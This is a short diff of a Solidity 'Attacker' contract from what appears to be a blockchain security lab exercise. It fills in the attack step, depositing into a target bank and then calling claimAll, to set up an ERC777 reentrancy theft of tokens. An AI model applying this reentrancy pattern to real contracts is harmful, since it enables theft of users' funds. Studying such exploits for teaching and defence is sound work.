@@ -38,11 +38,12 @@ contract Attacker is AccessControl, IERC777Recipient {
     require( address(bank) != address(0), "Target bank not set" );
     require(amt != 0);
 		//YOUR CODE TO START ATTACK GOES HERE
-    bank.claimAll();
+
 		if (depth == 0){
       emit Deposit(amt);
-      bank.deposit();
+     bank.deposit{value:amt}();
     }
+    bank.claimAll();
 	}
 	/*
 	   After the attack, this contract has a lot of (stolen) MCITR tokens
